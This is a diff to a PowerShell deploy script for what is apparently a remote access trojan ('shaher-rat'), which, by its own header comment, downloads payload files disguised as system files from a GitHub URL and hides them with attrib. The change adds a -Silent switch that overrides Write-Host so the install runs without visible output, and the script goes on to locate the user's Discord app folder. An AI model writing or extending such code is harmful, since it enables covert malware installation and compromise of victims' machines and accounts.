@@ -1,11 +1,24 @@
 ﻿# GitHub deploy - downloads system-disguised payload files and hides them with attrib +h +s
 
 param(
-    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/xx21sa/shaher-rat/main/deploy"
+    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/xx21sa/shaher-rat/main/deploy",
+    [switch]$Silent
 )
 
 $ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+if ($Silent) {
+    function Write-Host {
+        [CmdletBinding()]
+        param(
+            [object]$Object,
+            [switch]$NoNewline,
+            [object]$ForegroundColor,
+            [object]$BackgroundColor
+        )
+    }
+}
 
 function Get-DiscordAppFolder {
     $discordRoot = Join-Path $env:LOCALAPPDATA "Discord"
